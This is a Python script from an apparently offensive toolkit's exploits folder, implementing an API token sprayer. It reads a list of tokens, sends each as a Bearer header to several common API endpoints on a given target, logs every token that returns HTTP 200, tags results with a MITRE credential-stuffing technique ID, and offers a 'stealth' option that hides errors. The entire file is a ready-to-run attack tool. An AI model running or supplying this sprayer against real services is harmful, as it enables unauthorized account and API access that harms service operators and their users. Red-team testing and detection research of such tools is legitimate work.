# modules/exploits/api_token_sprayer.py

import requests
import argparse
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1110.003"  # Credential Stuffing via API Tokens

COMMON_ENDPOINTS = [
    "/api/v1/user",
    "/api/v1/token",
    "/api/v2/auth",
    "/api/private/data",
    "/internal/status"
]

def log_spray(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def spray_tokens(base_url, tokens, stealth=False):
    headers = {}
    for endpoint in COMMON_ENDPOINTS:
        full_url = base_url.rstrip("/") + endpoint
        for token in tokens:
            headers["Authorization"] = f"Bearer {token}"
            try:
                r = requests.get(full_url, headers=headers, timeout=5)
                status = r.status_code
                if status == 200:
                    print(f"[+] Valid token on {full_url}: {token}")
                    log_spray({
                        "timestamp": datetime.utcnow().isoformat(),
                        "target": full_url,
                        "token": token,
                        "status": status,
                        "ttp": MITRE_TTP,
                        "type": "api_token_spray"
                    })
            except Exception as e:
                if not stealth:
                    print(f"[!] Error hitting {full_url}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="API Token Sprayer")
    parser.add_argument("--url", required=True, help="Base API URL (e.g. https://target.com)")
    parser.add_argument("--tokens", required=True, help="File containing tokens, one per line")
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    with open(args.tokens, "r") as f:
        tokens = [line.strip() for line in f if line.strip()]
    spray_tokens(args.url, tokens, args.stealth)
